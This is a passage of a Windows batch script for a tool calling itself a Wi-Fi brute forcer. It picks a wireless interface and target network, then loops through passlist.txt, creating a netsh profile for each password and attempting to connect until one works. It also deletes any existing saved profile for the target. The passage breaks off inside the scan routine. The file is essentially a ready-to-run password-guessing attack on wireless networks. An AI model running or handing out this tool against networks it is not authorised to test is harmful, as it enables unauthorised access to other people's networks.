@echo off
set allowed_char_list="ABCDEFGHIJKLMNOPRSTUVYZWXQabcdefghijklmnoprstuvyzwxq0123456789-_"
cd BF_Files
title The WI-FI Brute Forcer - Developed By TUX
set /a attempt=1
del attempt.xml
del infogate.xml
cls
set targetwifi=No WI-FI Selected
set interface_description=Not Selected
set interface_id=Not Selected
set interface_mac=Not Selected
set interface_state=notdefined
setlocal enabledelayedexpansion
mode con: cols=80 lines=35
color 0f

call :interface_detection

if !interface_number!==1 (
    echo.
    call colorchar.exe /0b " Interface Detection"
    echo.
    echo.
    call colorchar.exe /0e " Only '1' Interface Found!"
    echo.
    echo.
    call colorchar.exe /0f " !interface_1_description!("
    call colorchar.exe /09 "!interface_1_mac!"
    call colorchar.exe /0f ")"
    echo.
    echo.
    echo  Making !interface_1_description! as default Interface...
    set interface_id=!interface_1!
    set interface_description=!interface_1_description!
    set interface_mac=!interface_1_mac!
    timeout /t 3 >nul
)

if !interface_number! gtr 1 (
    echo.
    call colorchar.exe /0b " Interface Detection"
    echo.
    echo.
    call colorchar.exe /0e " Multiple '!interface_number!' Interfaces Found!"
    echo.
    timeout /t 3 >nul
    call :interface_selection
)

if !interface_number!==0 (
    echo.
    call colorchar.exe /0b " Interface Detection"    
    echo.
    call colorchar.exe /0e " WARNING"
    echo.
    echo  No interfaces found on this device^^!
    echo.
    echo  Press any key to continue...
    timeout /t 5 >nul
    cls
)

goto :main

:main
set mainmenuchoice=
cls
echo.
echo  [---------------------------------------------------------------------------]
echo.                              ______________
echo                           ___/              \_
echo                 \_       /       _  __________\       _/
echo                   \     /         \/           \     /
echo                        /     \     \            \
echo              \_       /  \    \     \______      \       _/
echo                \      \   \    \     \___//      /      /
echo                        \__/\__/ \___/  __/      /
echo                         \             /        /
echo                \_        \                    /        _/
echo                  \        \                  /        /
echo                            \________________/
echo.
echo  [---------------------------------------------------------------------------]
call colorchar.exe /0b "                      Brute Force Manager Version 1.1.2 "
echo.
call colorchar.exe /0e "                              Developed By TUX"
echo.
echo  [---------------------------------------------------------------------------]
echo.

call colorchar.exe /0b "   Target - " 
echo !targetwifi!
call colorchar.exe /0b "   Interface - "
echo !interface_description!
echo.
echo    Type "help" for more info

call colorbox.exe /0F 1 19 76 25
echo.
echo.
call :userinput
set /p mainmenuchoice=

if !mainmenuchoice!==exit (
    exit
)

if !mainmenuchoice!==help (
    cls
    echo.
    call colorchar.exe /0b " Help Page"
    echo.
    echo.
    echo  - help             : Prints this page
    echo  - wifiscan         : Performs a WI-FI scan
    echo  - interface        : Select an interface for attack
    echo  - attack           : Attacks on selected WI-FI
    echo.
    echo  For more information, please read "readme.txt".
    echo.
    echo.
    echo  Other projects of TUX:
    echo  "https://www.bytechonline.wordpress.com"
    echo.
    echo  This project's UI has been made possible with TheBATeam group plugins.
    echo  "https://www.thebateam.org/"
    echo.
    echo  Press any key to continue...
    pause >nul
    cls
    goto :main
)

if !mainmenuchoice!==interface (
    cls
    call :interface_detection
    call :interface_selection
    cls
    goto :main
)

if !mainmenuchoice!==wifiscan (
    del infogate.xml
    call :wifiscan
    call :exporter !targetwifi!
    goto :main
)

if !mainmenuchoice!==attack (
    set /a attempt=1
    
    if "!targetwifi!"=="No WI-FI Selected" (
        call colorchar.exe /0c " Please select a WI-FI..."
        echo.
        echo.
        echo  Press any key to continue...
        timeout /t 5 >nul
        cls
        set mainmenuchoice=
        goto :main
    )
    
    if "!interface_description!"=="Not Selected" (
        call colorchar.exe /0c " Please select an interface..."
        echo.
        echo.
        echo  Press any key to continue...
        timeout /t 5 >nul
        cls
        set mainmenuchoice=
        goto :main
    )

    cls
    echo.
    call colorchar.exe /0e " WARNING"
    echo.
    echo  If you connected to a network with this same name "!targetwifi!",
    echo  its profile will be deleted.
    echo.
    echo.
    echo  This app might not find the correct password if the signal strength
    echo  is too low!
    echo.
    echo  A good USB WI-FI antenna is recommended.
    echo.
    echo  Press any key to continue...
    pause >nul
    netsh wlan delete profile !targetwifi! interface="!interface_id!"
    cls
    echo.
    call colorchar.exe /0b " Processing passlist..."
    echo.
    set /a password_number=0
    for /f "tokens=1" %%a in ( passlist.txt ) do (
        set /a password_number=!password_number!+1
    )
    cls

    for /f "tokens=1" %%a in ( passlist.txt ) do (
        set temppass=%%a
        set temp_auth_num=0
        call :finalfunction !temppass!
        netsh wlan add profile filename=attempt.xml >nul
        call :calc_percentage "!attempt!" "!password_number!"
        cls
        echo  [==================================================]
        call colorchar.exe /07 "  Target WI-FI: "
        echo !targetwifi!
        call colorchar.exe /07 "  Total Passwords: "
        call colorchar.exe /0f "!password_number!"
        echo.
        call colorchar.exe /07 "  Percentage: "
        echo  %% !pass_percentage!    
        echo  [==================================================]
        call colorchar.exe /0b "  Trying the password -" 
        echo  !temppass!
        echo  [==================================================]
        call colorchar.exe /0e "  Attempt -"
        echo  !attempt!
        echo  [==================================================]
        echo   Current State:
        netsh wlan connect name=!targetwifi! interface="!interface_id!" >nul

        for /l %%a in ( 1, 1, 20) do (
            call :find_connection_state
            if !interface_state!==connecting (
                del infogate.xml
                del attempt.xml
                goto :show_result
            )
            if !interface_state!==connected (
                del infogate.xml
                del attempt.xml
                goto :show_result
            )
        )

        set /a attempt=!attempt!+1
        del attempt.xml
    )

    :naber
    cls
    echo.
    echo  [==================================================]
    call colorchar.exe /0c "  Password not found. :'("
    echo.
    echo  [==================================================]
    echo.
    echo  Press any key to continue...
    pause >nul
    cls
    goto :main
)

call colorchar.exe /0c " Invalid input"
timeout /t 2 >nul
goto :main

:wifiscan
set /a keynumber=
set choice=
cls

if "!interface_id!"=="Not Selected" (
    echo.
    call colorchar.exe /0c " You have to select an interface to perform a scan..."
    echo.
    echo.
    echo  Press any key to continue...
    timeout /t 5 >nul
    cls
    goto :main
)

if !interface_number!==0 (
    echo.
    call colorchar.exe /0c " You have at least '1' WI-FI interface to perform a scan..."
    echo.
    echo.
    echo  Press any key to continue...
    timeout /t 5 >nul
    cls
    goto :main
)

for /f "tokens=1-3 skip=7" %%a in ('netsh wlan show interfaces') do ( 
    if %%a==State ( 
        if %%c==connected ( 
            echo.
            echo  Disconnect
